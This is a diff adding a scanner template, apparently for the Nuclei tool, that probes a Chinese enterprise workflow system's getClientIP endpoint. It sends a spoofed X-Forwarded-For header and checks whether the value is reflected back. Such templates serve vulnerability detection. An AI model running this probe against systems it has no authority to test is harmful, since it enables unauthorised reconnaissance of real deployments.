@@ -1,0 +1,56 @@
+id: poc-yaml-skzy-epcs-getremoteaddr-design-defects
+info:
+  name: 时空智友企业流程化管控系统 getRemoteAddr 设计缺陷漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 配置不当
+  description: |
+    Exploits a design flaw in 时空智友企业流程化管控系统's getRemoteAddr endpoint to identify improper handling of client IP headers.
+
+variables:
+  ip: "255.255.255.255"
+
+flow: http(1) && http(2)
+
+http:
+  - id: initial-request
+    method: GET
+    path:
+      - "/formservice?service=utility.getClientIP"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<root>"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+
+  - id: header-injection
+    method: GET
+    path:
+      - "/formservice?service=utility.getClientIP"
+    headers:
+      X-Forwarded-For: "{{ip}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<root>"
+        part: body
+      - type: word
+        words:
+          - "{{ip}}"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
